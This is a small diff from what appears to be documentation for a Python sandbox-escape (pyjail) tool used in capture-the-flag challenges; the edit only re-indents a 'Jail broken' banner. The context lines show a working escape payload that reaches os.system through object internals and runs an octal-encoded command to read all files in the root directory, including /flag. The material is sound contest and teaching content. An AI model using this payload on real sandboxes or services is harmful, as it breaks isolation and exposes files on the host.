@@ -531,7 +531,7 @@ Typhon-Sample Pyjail 1
     "".__class__.__bases__[0].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('os').system('\143\141\164 \57\52')
 
 
-+++++++++++Jail broken+++++++++++
+    +++++++++++Jail broken+++++++++++
 
 使用上述 payload 读取根目录下所有文件（包含 ``/flag`` ）。
 
